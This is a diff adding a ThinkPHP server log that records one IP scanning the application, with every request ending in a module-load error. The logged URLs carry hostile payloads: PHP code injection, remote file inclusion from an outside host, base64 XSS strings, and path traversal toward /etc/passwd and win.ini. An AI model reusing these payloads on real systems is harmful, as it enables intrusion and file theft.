@@ -1,0 +1,115 @@
+[ 2016-04-20T02:31:46+08:00 ] 121.42.0.31 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001128s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001551s ]
+ERR: 无法加载模块:Public
+
+[ 2016-04-20T02:32:06+08:00 ] 121.42.0.31 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001087s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001439s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2016-04-20T02:32:09+08:00 ] 121.42.0.31 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001188s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001545s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-04-20T02:32:11+08:00 ] 121.42.0.31 /index.php?s=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001204s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001626s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();
+
+[ 2016-04-20T02:32:14+08:00 ] 121.42.0.31 /index.php?s=http://120.26.55.211/s.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001170s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001595s ]
+ERR: 无法加载模块:Http:
+
+[ 2016-04-20T02:32:16+08:00 ] 121.42.0.31 /index.php?s=http%3A%2F%2F120.26.55.211%2Fs.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001168s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001527s ]
+ERR: 无法加载模块:Http:
+
+[ 2016-04-20T02:32:19+08:00 ] 121.42.0.31 /index.php?s=a_long_name_file_not_exist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001206s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001694s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2016-04-20T02:33:01+08:00 ] 121.42.0.31 /index.php?s=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001108s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001534s ]
+ERR: 无法加载模块:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+[ 2016-04-20T02:33:04+08:00 ] 121.42.0.31 /index.php?s=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001297s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001670s ]
+ERR: 无法加载模块:AmF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+
+[ 2016-04-20T02:33:11+08:00 ] 121.42.0.31 /index.php?s=%2Fetc%2Fpasswd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001160s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001504s ]
+ERR: 无法加载模块:Etc
+
+[ 2016-04-20T02:33:14+08:00 ] 121.42.0.31 /index.php?s=c%3A%2F%2Fwindows%2Fwin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001144s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001488s ]
+ERR: 无法加载模块:C:
+
+[ 2016-04-20T02:33:26+08:00 ] 121.42.0.31 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001098s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001447s ]
+
+[ 2016-04-20T02:33:29+08:00 ] 121.42.0.31 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001158s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001504s ]
+
+[ 2016-04-20T02:33:31+08:00 ] 121.42.0.31 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001498s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001887s ]
+
+[ 2016-04-20T02:33:34+08:00 ] 121.42.0.31 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001105s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001446s ]
+
+[ 2016-04-20T02:34:16+08:00 ] 121.42.0.31 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001126s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001485s ]
+ERR: 无法加载模块:Public
+
+[ 2016-04-20T02:56:21+08:00 ] 121.42.0.31 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001164s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001517s ]
+ERR: 无法加载模块:Public
+
